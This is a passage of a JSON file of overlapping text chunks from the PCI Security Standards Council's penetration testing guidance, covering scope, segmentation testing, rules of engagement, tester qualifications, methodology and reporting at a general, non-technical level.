tested. Tests may grow in time and complexity if efforts uncover additional scope. 2.2 Scope PCI DSS defines the cardholder data environment (CDE) as “the people, processes, and technology that store, process, or transmit cardholder data or sensitive authentication data.” The scope of a penetration test, as defined in PCI DSS Requirement 11.3, includes the entire CDE perimeter and any critical systems. This applies both to the external perimeter (public-facing attack surfaces) and the internal perimeter of the CDE (LAN-LAN attack surfaces). The scope of testing may include locations of cardholder data, applications that store, process, or transmit cardholder data, critical network connections, access points, and other targets appropriate for the complexity and size of the organization. This should include resources and assets utilized by personnel to maintain systems in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 3
    }
  },
  {
    "text": "in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See Section 4.1.3, “Rules of Engagement.” The intent of this document is to provide supplemental information. Information provided here does not 7\\n2.2.1 External Penetration Test The scope of an external penetration test is the exposed external perimeter of the CDE and critical systems connected or accessible to public network infrastructures. It should assess any unique access to the scope from the public networks, including services that have access restricted to individual external IP addresses. Testing must include both application-layer and network-layer assessments. External penetration tests also include remote access vectors such as dial-up and VPN connections. 2.2.2 Internal Penetration Test The scope of the internal penetration test is the internal perimeter of the CDE and critical systems from the perspective of the internal network. Testing must include both application-layer and network-layer assessments. Where the CDE is also the only internal network and there is no internal CDE perimeter, the scope of testing will typically be focused on critical systems. For example, testing activities may include attempting to bypass internal access controls intended to prevent unauthorized access or use of systems that store, process, or transmit CHD from those that do not. In cases where there is an internal CDE perimeter, the scope of testing will need to consider the CDE perimeter as well as critical systems within and outside of the CDE. For example, the testing may attempt to exploit permitted access paths from systems on an internal network segment into the CDE. When access to the CDE is obtained as a result of the testing, the scope of the penetration test may allow the tester to continue exploring inside the network and further the attack against other systems within the CDE, and may also include testing any data-exfiltration prevention (data-loss prevention) controls that are in place. In all cases, the scope of internal testing should consider the specific environment and the entity’s risk assessment. Entities are encouraged to consult with their assessor and the penetration tester to ensure the scope of the penetration test is sufficient and appropriate for their particular environment. 2.2.3 Testing Segmentation Controls The intent of segmentation is to prevent out-of-scope systems from being able to communicate with systems in the CDE or impact the security of the CDE. When properly implemented, a segmented (out-of- scope) system component could not impact the security of the CDE, even if an attacker obtained control of the out-of-scope system. If segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 4
    }
  },
  {
    "text": "segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of scope for PCI DSS to verify they do not have connectivity to the CDE and cannot be used to impact the security of the CDE. The intent of this assessment is to validate the effectiveness of the segmentation controls separating the out-of-scope environments from the CDE and to ensure the controls are operating as intended. The intent of this document is to provide supplemental information. Information provided here does not 8\\n2.2.4 Critical Systems The term “critical systems” is used in PCI DSS to reference systems that are involved in the processing or protection of cardholder data. PCI DSS provides examples of critical systems that may be impacted by identified vulnerabilities including “security systems, public-facing devices and systems, databases, and other systems that store, process, or transmit cardholder data” (Requirement 6.1). However, for the purposes of a penetration test, there may be additional systems outside the CDE boundaries that could affect the security of the CDE. These systems should also be considered to be critical systems. Common examples of critical systems relevant to a penetration test might include: security systems (for example, firewalls, intrusion-detection systems/intrusion-prevention systems (IDS/IPS), authentication servers, e- commerce redirection servers, etc.), or any assets utilized by privileged users to support and manage the CDE. Please note that critical systems are defined by the entity, as each environment is different. 2.3 Application-Layer and Network-Layer Testing Any software written by or specifically for the organization that is part of the penetration test scope should be subject to both an application and network-layer penetration test. This assessment helps identify security defects that result from either insecure application design or configuration, or from employing insecure coding practices or security defects that may result from insecure implementation, configuration, usage, or maintenance of software. The remediation of vulnerabilities identified during an application-layer assessment may involve redesigning or rewriting insecure code. The remediation of vulnerabilities identified during a network-layer assessment typically involves either reconfiguring or updating software. In some instances, remediation may include deploying a secure alternative to insecure software. 2.3.1 Authentication If the application requires user authentication to the custom software, testing should be performed against all roles or types of access assumed by these parties. Also, testing should be performed against any role or access type that does not have explicit authorization to cardholder data to verify accounts without access cannot compromise such data. For customers running applications on multitenant servers that provide customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 5
    }
  },
  {
    "text": "customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those credentials allow access to data beyond the entity’s data. 2.3.2 PA-DSS Compliant Applications If a payment application has been PA-DSS validated, the application’s functionality does not need to be tested as part of the entity’s PCI DSS compliance validation. However, the implementation of the application does need to be tested. This includes both the operating system and any exposed services, but not the payment application’s functionality (e.g., authentication, key management, transaction processing, etc.) since this was validated as part of the PA-DSS application validation. The intent of this document is to provide supplemental information. Information provided here does not 9\\n2.3.3 Web Applications It is common for an environment to host a web application that was not specifically coded for the organization such as commercial, off-the-shelf web-mail interfaces, document-sharing tools, file-transfer services, network-device administrative interfaces, etc. In these instances, the web application does not typically need an application-layer penetration test as the entity is not responsible for the source code of this type of software. Instead, the tester should perform a network-layer test and ensure the software was implemented, configured, and is currently being maintained in a secure manner (disabling or uninstalling unused services, blocking unused ports, applying current updates, etc.). 2.3.4 Separate Testing Environment Because of the nature and the intent of penetration testing, such testing in a production environment during normal business hours may impact business operations, and attempts to avoid disruption may increase the time, resources and complexity of the testing. This is especially important for high availability systems that may be impacted by penetration testing in a production environment. To avoid disruptions and to speed up testing, a separate environment that is identical to the production environment may be used for testing instead of the production environment. The penetration tester would need to ensure the same application and network-layer controls as production exist in the testing environment. This may be accomplished through methods to map out the production environment to verify it matches the testing environment. This should be included in the rules of engagement. All exploitable vulnerabilities identified during the testing must be corrected on production systems and testing repeated to verify that security weaknesses have been addressed. 2.4 Segmentation Checks PCI DSS Requirement 11.3.4 requires penetration testing to validate that segmentation controls and methods are operational, effective, and isolate all out-of-scope systems from systems in the CDE. Therefore, a robust approach to penetration testing is recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 6
    }
  },
  {
    "text": "recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests from every individual LAN segment. In this case, the testing needs to be planned to examine each type of segmentation methodology in use (i.e., firewall, VLAN ACL, etc.) in order to validate the effectiveness of the segmentation controls. The level of testing for each segmentation methodology should provide assurance that the methodology is effective in all instances of use. In order to effectively validate the segmentation methodologies, it is expected that the penetration tester has worked with the organization (or the organization’s QSA) to clearly understand all methodologies in use in order to provide complete coverage when testing. The penetration tester may choose to include systems located in these isolated LAN segments not directly related to the processing, transmission, or storage of cardholder data to ensure these systems could not impact the security of the CDE if compromised. See Section 4.2.3 for specific guidance on testing methodologies for validating segmentation controls. The intent of this document is to provide supplemental information. Information provided here does not 10\\n2.5 Social Engineering Social engineering is the attempt to gain information, access, or introduce unauthorized software into the environment through the manipulation of end users. PCI DSS reconfirms testing by requiring industry accepted penetration-testing approaches (many of which include social engineering as part of their approach) and to have an approach to penetration testing that \"considers the threats and vulnerabilities experienced by merchants in the last 12 months.\" This may include social-engineering attacks as a method used for introducing malware into the environment. Social-engineering tests are an effective method of identifying risks associated with end users’ failure to follow documented policies and procedures. There is no blanket approach to social-engineering engagements. If an organization chooses to include social-engineering testing as part of its annual security review, the tests performed should be appropriate for the size and complexity of the organization and should consider the maturity of the organization’s security awareness program. These tests might include in-person, non- technological interactions such as persuading someone to hold open a door, remote interactions such as having someone provide or reset a password, or convincing the end user to open a vulnerable e-mail attachment or hyperlink. While PCI DSS does not require testing to include social-engineering techniques, an entity can incorporate it into its penetration testing methodology as an ongoing method to determine the effectiveness of the security awareness program. The frequency of social-engineering tests would be determined by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 7
    }
  },
  {
    "text": "by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing an effective and robust security awareness program can be found in the Document Library on the PCI SSC website. Social-engineering testing may not be appropriate or provide a meaningful result for all organizations. Although social-engineering testing is not a requirement of PCI DSS, an organization may consider documenting the reason(s) for foregoing social-engineering testing and include applicable documentation with the internal and external penetration test reports, particularly if social-engineering attacks were encountered in the last 12 months. 2.6 What is considered a “significant change”? Per PCI DSS Requirements 11.3.1 and 11.3.2, penetration testing must be performed at least annually and after any significant change—for example, infrastructure or application upgrade or modification—or new system component installations. What is deemed “significant” is highly dependent an entity’s risk- assessment process and on the configuration of a given environment. Because of this variability, a significant change is not prescribed by PCI DSS. If the change could impact the security of the network or allow access to cardholder data, it may be considered significant by the entity. Penetration testing of significant changes is performed to ensure that controls assumed to be in place are still working effectively after the upgrade or modification. The intent of this document is to provide supplemental information. Information provided here does not 11\\n3 Qualifications of a Penetration Tester Qualified internal resources or a qualified third party may perform the penetration test as long as they are organizationally independent. This means the penetration tester must be organizationally separate from the management of the target systems. For example, in situations where a third-party company is performing the PCI DSS assessment for the entity, that party cannot perform the penetration test if they were involved in the installation, maintenance, or support of target systems. The following guidelines may be useful when selecting a penetration tester (or team) to understand their qualifications to perform penetration testing. 3.1 Certifications Certifications held by a penetration tester may be an indication of the skill level and competence of a potential penetration tester or company. While these are not required certifications, they can indicate a common body of knowledge held by the candidate. The following are some examples of common penetration testing certifications:  Offensive Security Certified Professional (OSCP)  Certified Ethical Hacker (CEH)  Global Information Assurance Certification (GIAC) Certifications (e.g., GIAC Certified Penetration Tester (GPEN), GIAC Web Application Penetration Tester (GWAPT), or GIAC Exploit Researcher and Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone. Therefore, confirmation of",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 8
    }
  },
  {
    "text": "Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone. Therefore, confirmation of additional criteria is necessary. For example, review of the extent of actual engagements that have been performed and relevant work experience are important considerations when selecting a penetration tester or team. The following questions are examples for assessing the qualifications and competency of a penetration tester or team. This is not an exhaustive list: Q How many years’ experience does the penetration tester have? • If the penetration tester is in their first year of penetration testing, careful consideration should be given to the following questions to ensure the penetration tester has sufficient knowledge and is adequately trained to perform the penetration test. Consideration should also be given to the organization itself by verifying the training and QA processes to ensure penetration tester is qualified. The intent of this document is to provide supplemental information. Information provided here does not 12\\nQ How many years has the organization that employs the penetration tester been performing penetration tests? • References from other customers may be useful in consideration. Q Has the penetration tester performed assessments against organizations of similar size and scope? • For environments with high availability constraints, unstable system components, or large infrastructures, it is important to evaluate a tester’s ability to handle those restrictions (bandwidth constraints, time constraints, etc.). Q What penetration testing experience has the penetration tester or team had with the technologies in the target environment (i.e., operating systems, hardware, web applications, highly customized applications, network services, protocols, etc.)? • When selecting a penetration tester, it is important to evaluate the past testing experience of the organization for which the tester works as it pertains to technologies specifically deployed within the target environment. • Even if the penetration tester has not performed an assessment against certain specific technologies, if the tester has managed, maintained, been trained on, or developed said technologies, the tester may still be qualified to perform the penetration test. Q Consider what other skills/qualifications the penetration tester has that will contribute to their ability to assess the environment. • Are there industry-standard penetration testing certifications held by the penetration tester? (See Section 3.1.) • What type of experience does the penetration tester have conducting network-layer penetration testing? Discussion of examples of network penetration testing efforts conducted by the organization may be warranted. • Does the penetration tester have experience conducting application-layer penetration testing? Discussion of the penetration tester’s familiarity with testing to validate the OWASP Top 10 and other similar application secure-coding standards and examples of application penetration testing efforts conducted by the organization may be warranted. Note: An organization may want to consider having a development-environment lab where penetration tests can be performed outside of the production environment and internal resources can train",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 9
    }
  },
  {
    "text": "OWASP Top 10 and other similar application secure-coding standards and examples of application penetration testing efforts conducted by the organization may be warranted. Note: An organization may want to consider having a development-environment lab where penetration tests can be performed outside of the production environment and internal resources can train and increase their experience to help both their skills and potential certifications. The intent of this document is to provide supplemental information. Information provided here does not 13\\n4 Methodology To ensure a successful penetration test, there are several activities and processes to be considered beyond the testing itself. This section provides guidance for these activities and is organized by the typical phases that occur during a penetration test: pre-engagement, engagement, and post-engagement. 4.1 Pre-Engagement Before the engagement or testing begins, it is recommended that all parties involved (the organization, the tester, and where applicable, the assessor) be informed of the types of testing (i.e., internal, external, application-layer or network-layer) to be performed, how testing will be performed, and what the testing will target. By coordinating these details first, issues where the CDE scope is defined improperly or other issues arise that would require a retest might be avoided. This information may be gathered by conducting a pre- engagement call or during an on-site pre-engagement meeting. 4.1.1 Scoping The organization being assessed is responsible for defining the CDE and any critical systems. It is recommended that the organization work with the tester and, where applicable, the assessor to verify that no components are overlooked and to determine whether any additional systems should be included in scope. The scope of the penetration test should be representative of all access points, critical systems, and segmentation methodologies for the CDE. 4.1.2 Documentation Whenever possible, detailed documentation of any components within the scope should be made available to the tester. Common examples of such documents are application-interface documentation and implementation guides. This information will ensure the tester understands how functionality should work and whether results received are expected for the given scenario. As a part of the scoping process, the organization should consider supplying the tester with the following documentation:  A network diagram depicting all network segments in scope for the test (Refer to PCI DSS Requirements 1.1.2 and 1.1.3.)  Cardholder data flow diagram  A list of all expected services and ports exposed at the CDE perimeter  Details of how authorized users access the CDE  A list of all network segments that have been isolated from the CDE to reduce scope The penetration tester will use this information during the assessment to identify unexpected attack vectors of the CDE in addition to known attack vectors, insufficient authentication controls, and to confirm the proper segmentation of out-of-scope environments. The intent of this document is to provide supplemental information. Information provided here does not 14\\n4.1.3 Rules of Engagement Prior to the commencement of any testing, it is important to document and agree upon the conditions in which testing is to be performed",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 10
    }
  },
  {
    "text": "confirm the proper segmentation of out-of-scope environments. The intent of this document is to provide supplemental information. Information provided here does not 14\\n4.1.3 Rules of Engagement Prior to the commencement of any testing, it is important to document and agree upon the conditions in which testing is to be performed and the degree of exploitation, if any, that is permitted. This authorizes the tester to test the environment and ensure the organization understands what to expect from the penetration test. Below are some examples of considerations that may be included in the rules of engagement:  During what time window will testing need to be performed?  Are there any legacy systems that have known issues with automated scanning? If so, how should testing be performed against these systems?  Is there a preferred method of communicating about scope and issues encountered during the engagement?  Does the entity want updates regarding ongoing exploitation of systems during the test? If so, the entity will need to determine whether they will or will not act upon such information or make changes to the environment. The entity may also want to implement its incident response plan in response to an exploit.  Are there security controls that would detect or prevent testing? Consider whether these should be disabled or configured to not interfere during testing. (See Section 4.1.7 for further guidance.)  If passwords or other sensitive data are compromised during the testing, does the tester need to disclose a list of all passwords and/or sensitive data accessed?  If equipment owned by the tester is to be connected to the organization’s network, what steps must be taken to ensure the equipment does not pose a threat to the environment (updated to the latest operating system, applied service packs and/or patches, etc.)?  Does the tester need to provide all IP addresses from which testing will originate?  Will sensitive data shown to be accessible during the test be retained by the tester during and after the penetration test? Only a proof-of-concept test should be performed, any cardholder data obtained must be secured in accordance with PCI DSS. (See Section 4.2.4 for more guidance.)  What steps will be taken if the tester detects a previous or active compromise to systems being tested? (For example, activate incident response procedures and stop penetration test until resolution of the compromise situation.) The intent of this document is to provide supplemental information. Information provided here does not 15\\n4.1.4 Third-Party-Hosted / Cloud Environments Below are examples of considerations that may be included in the rules of engagement for third-party- hosted/cloud environments of the entity:  If a service-level agreement requires approval from a third party before penetration tests can be conducted, the organization must receive approval from the third party (i.e., hosting provider, etc.) before the assessment is to take place.  The scope may not include the infrastructure provided by the third party to the entity. The scope may include any systems managed, built, or",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 11
    }
  },
  {
    "text": "penetration tests can be conducted, the organization must receive approval from the third party (i.e., hosting provider, etc.) before the assessment is to take place.  The scope may not include the infrastructure provided by the third party to the entity. The scope may include any systems managed, built, or utilized by the organization.  Unless otherwise noted in the scope, web-management portals provided by the third party for the entity to manage its infrastructure should not be included in the penetration test—these interfaces should be tested and validated as part of the third party’s PCI DSS compliance efforts, and evidence or attestation of validation should be provided to the customer. 4.1.5 Success Criteria The intent of a penetration test is to simulate a real-world attack situation with a goal of identifying how far an attacker may be able to penetrate into the environment. Defining the success criteria for the penetration test allows the entity to set limits on the depth of the penetration test. Without agreeing upon the point at which the penetration test is complete, there is a possibility of the tester exceeding the boundaries and expectations of the target entity. This should be documented in the rules of engagement. Possible success criteria may include:  Direct observation of restricted services or data in the absence of expected access controls  Compromise of an intermediary device used by privileged users to access the CDE  Compromise of the domain used by privileged users  No compromise of the target systems The success criteria will be different for every environment and should be established during initial pre- engagement meeting prior to testing. 4.1.6 Review of Past Threats and Vulnerabilities PCI DSS Requirement 11.3 requires a review and consideration of threats and vulnerabilities encountered by the assessed entity within the past 12 months. This is an historical look at real vulnerabilities experienced or discovered in the entity’s environment since the last assessment. This information may provide insight to the process in place to handle these vulnerabilities. The intent of this document is to provide supplemental information. Information provided here does not 16\\nThe penetration tester should be familiar with current vulnerabilities seen by the industry over the past 12 months as well as take a detailed look at recent vulnerabilities experienced by the entity. Depending on the type of test to be performed (i.e., white box, grey box, black box), the following may or may not be considered in such a review:  Vulnerabilities discovered by the entity which have not been remediated within the time period required by PCI DSS (example: quarterly), and/or by the vulnerability remediation requirements documented in the corporate security policy  Existing compensating controls mitigating the noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 12
    }
  },
  {
    "text": "noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking vulnerabilities that may have not been detected at the time of the most recent penetration test The tester may gain additional insight of the target environment for this review by:  Reviewing prior penetration test reports  Reviewing previously issued Reports on Compliance or Attestations of Compliance  Reviewing current vulnerability scan test results 4.1.7 Avoid scan interference on security appliances. In many environments, active protection controls such as an intrusion prevention system or web active protection systems such as intrusion protection systems (IPS) and web application firewalls (WAF) may be deployed to protect exposed services. Because the intent of the penetration test is to evaluate the services’ susceptibility to exploitation (vs. the active protection systems’ ability to prevent attacks), interference with the penetration test should be avoided—entities are encouraged to review and be familiar with the section titled “Scan Interference” in the ASV Program Guide and configure active protection systems accordingly during testing. This practice helps ensure that the services themselves are configured properly and have the minimal risk of being exploited in the event the active protection system fails or is somehow defeated or bypassed by an attacker. 4.2 Engagement: Penetration Testing Each environment has unique aspects/technology that requires the tester select the most appropriate approach and the tools necessary to perform the penetration test. It is beyond the scope of this document to define or outline which approach, tools, or techniques are appropriate for each penetration test. Instead, the following sections provide high-level guidance on considerations for the approach, tools, or techniques. The intent of this document is to provide supplemental information. Information provided here does not 17\\nPenetration testing is essentially a manual endeavor. In many cases, tools exist that can aid the tester in performing the test and alleviate some of the repetitive tasks. Judgment is required in selecting the appropriate tools and in identifying attack vectors that typically cannot be identified through automated means. Penetration testing should also be performed from a suitable location, with no restrictions on ports or services by the Internet provider. For example, a penetration tester utilizing Internet connectivity provided to consumers and residences may have SMTP, SNMP, SMB, and other ports restricted by the Internet provider to minimize impact by viruses and malware. If testing is performed by a qualified internal resource, the test should also be performed from a neutral Internet connection unaffected by access controls that might be present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 13
    }
  },
  {
    "text": "present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will allow the tester to determine if, at any given role, the user could escalate privileges or otherwise gain access to data they are not explicitly allowed to access. In instances where the organization has created new accounts for the tester to use, it is important that the organization ensure all roles and applicable security in the application have been set up to allow the tester to effectively test all functionality. In instances where a web application utilizes a back-end API, the API may be in scope for the testing. The tester should understand the interaction between the web application and the backend, the functionality exposed by the API, as well as any security controls implemented to protect access to the API. Those, and other factors, will help determine whether the back-end API should be tested independently from the web application. 4.2.2 Network Layer Since most protocols are well defined and have standard modes of interaction, network-layer testing is more suitable for automated testing. This makes automation the first logical step in a network-layer test. Because of such standardization, tools may be used to quickly identify a service, the version of the software, test for common misconfigurations, and even identify vulnerabilities. Automated tests can be performed much faster than could be expected of a human. However, simply running an automated tool does not satisfy the penetration testing requirement. Automated tools cannot interpret vulnerabilities, misconfigurations, or even the services exposed to assess the true risk to the environment. The automated tool only serves as a baseline indication of the potential attack surface of the environment. The penetration tester must interpret the results of any automated tools and determine whether additional testing is needed. Using the documentation provided by the organization during the pre-engagement, the tester should:  Verify that only authorized services are exposed at the CDE perimeter.  Attempt to bypass authentication controls from all network segments where authorized users access the CDE, as well as segments not authorized to access the CDE. The intent of this document is to provide supplemental information. Information provided here does not 18\\n4.2.3 Segmentation The segmentation check is performed by conducting tests used in the initial stages of a network penetration test (i.e., host discovery, port scanning, etc.). It should verify that all out-of-scope LANs truly have no access to the CDE. For environments with a large number of network segments considered to be out of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 14
    }
  },
  {
    "text": "of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the segmentation check that a LAN segment thought to be out of scope has access into the CDE, the organization will either need to adjust the segmentation controls to block that access, or perform a full network-layer penetration test to characterize the access and the impact on PCI DSS scope. 4.2.4 What to do when cardholder data is encountered If cardholder data is accessed during the penetration test, it is important that the tester notify the organization immediately. The tester should keep detailed documentation as to exactly what data was accessed and how it was accessed. After being notified, the organization should immediately review how the cardholder data was retrieved and, as appropriate, should take steps to execute its incident response plan. If the output of testing tools or activities includes cardholder data that was accessed by the tester during the engagement, it is important this output be secured in accordance with PCI DSS. 4.2.5 Post-Exploitation The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation or pivoting techniques—which allows the tester, in this case, to establish a new source of attack from the new vantage point in the system—to gain additional access to systems or network resources. Penetration testers should be able to demonstrate the risk presented by exploitable systems to the CDE and what post-exploitation may likely occur with those systems. 4.3 Post-Engagement After the engagement or testing has been performed, there are activities both parties should carry out. 4.3.1 Remediation Best Practices Penetration testing efforts, while thorough, may not always guarantee exhaustive identification of every instance where a security control’s effectiveness is insufficient—e.g., finding a cross site scripting vulnerability in one area of an application may not reveal all instances of this vulnerability in the application. Often the presence of vulnerability in one area may indicate weakness in process or development practices that could have replicated or enabled similar vulnerability in other locations. Therefore, it is important for the tested entity to carefully investigate systems or applications with the ineffective security controls in mind when remediating. The intent of this document is to provide supplemental information. Information provided here does not 19\\n4.3.2 Retesting Identified Vulnerabilities The organization should take steps to remediate any exploitable vulnerability within a reasonable period of time after the original test. When the organization has completed these steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported. This determination",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 15
    }
  },
  {
    "text": "steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported. This determination may be made after a risk analysis of how much change has occurred since the original testing was completed. In specific conditions, the flagged security issue may represent a fundamental flaw in an environment or application. The scope of a retest should consider whether any changes occurring as a result of remediation identified from the test are classified as significant. All changes should be retested; however, whether a complete system retest is necessary will be determined by the risk assessment of those changes. 4.3.3 Cleaning up the Environment It is important for the tester to document and disclose to the organization any alterations made to the environment (as permitted in the Rules of Engagement) during the test, including but not limited to:  Accounts that were created as a part of the assessment either by the entity or the tester: the organization should then remove these accounts.  Tools installed by the tester on the organization’s systems: these tools should be removed at the end of the testing. Removal of accounts and test tools will ensure the accounts or remnant tools could not be exploited or used against the organization. 4.4 Additional Resources There are multiple industry-accepted methodologies that may provide additional guidance on penetration testing activities, including but not limited to:  Open Source Security Testing Methodology Manual (“OSSTMM”)  The National Institute of Standards and Technology (“NIST”) Special Publication 800-115  OWASP Testing Guide  Penetration Testing Execution Standard  Penetration Testing Framework The intent of this document is to provide supplemental information. Information provided here does not 20\\n5 Reporting and Documentation The purpose of the report is to assist the organization in its efforts to improve its security posture by identifying areas of potential risk that may need to be remediated. Merely reporting lists of vulnerabilities is not helpful in this endeavor and does not meet the intent of the penetration test. The report should be structured in a way to clearly communicate what was tested, how it was tested, and the results of the testing. This section provides guidance on documenting identified and/or exploited vulnerabilities, creating reporting templates, and evaluating a penetration test report. 5.1 Identified Vulnerability Reporting Penetration test reports should include a discussion of the steps, vectors, and exploited vulnerabilities that lead to penetration during testing for which remediation and retesting are required. However, it is possible for the tester to identify vulnerabilities that were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 16
    }
  },
  {
    "text": "were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not exploited for valid reasons and should be included in the report may be:  Firewall misconfigurations that permit unauthorized traffic between secure and insecure zones  Detection of credentials obtained through manipulation of a web-application error message that was not flagged during an ASV scan due to a low CVSS base score 5.1.1 Assigning a Severity Score In order to prioritize remediation of the penetration test findings, it is a common practice during the reporting phase for a severity or risk ranking to be assigned for each detected security issue. The report should clearly document how the severity/risk ranking is derived. In most cases, severity/risk ranking may be applied as a result of evaluating an industry-standard score (e.g., NVD, CVSS) against a threshold or value that indicates risk (i.e., high, medium, and low). However, it should be noted that it is possible for a vulnerability to exist that is inherent to a particular environment; therefore, a standardized score is not available. When custom scoring is part of the risk-ranking process, the report should reflect a traceable set of reasoning for the modification of industry-standard scores or, where applicable, for the creation of a score for a vulnerability that does not have an industry-standard score defined. The intent of this document is to provide supplemental information. Information provided here does not 21\\n5.1.2 Industry Standard References Some well-known, industry-standard references include:  National Vulnerability Database (NVD)  Common Vulnerability Scoring System (CVSS)  Common Vulnerabilities and Exposure (CVE)  Common Weakness Enumeration (CWE)  Bugtraq ID (BID)  Open Source Vulnerability Database (OSVDB) The Common Vulnerability Scoring System (CVSS) is an example of an open framework that may be referenced for assigning a baseline risk rating. The CVSS is the required scoring system for Approved Scanning Vendors (ASVs) to use for ranking vulnerabilities detected during PCI vulnerability scans. Using this system, a standardized vulnerability score can be adjusted through the evaluation of the traits of vulnerability within the context of a specific environment. 5.2 Reporting Guidelines Comprehensive and consistent reporting is a critical phase of a penetration test. This section provides guidelines on common contents of an industry standard penetration test. It should be noted that these are only suggested outlines and do not define specific reporting requirements for PCI DSS penetration tests. Testers may have different sections, alternative titles, and/or report format, etc.; this outline represents data gathered from a number of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 17
    }
  },
  {
